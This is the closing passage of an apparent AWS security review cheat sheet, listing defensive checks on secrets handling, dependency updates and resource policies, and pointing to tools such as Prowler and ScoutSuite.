    * No hardcoded secrets in code or environment variables (use Secrets Manager/Parameter Store).
    * Dependencies regularly updated.
    * Review resource-based policies for overly permissive invokers.

This cheat sheet provides a starting point. Always refer to the latest AWS documentation and security best practices. Tools like Prowler or ScoutSuite can automate many configuration review checks. Remember to tailor your approach based on the specific environment and the scope of the engagement. Good luck!
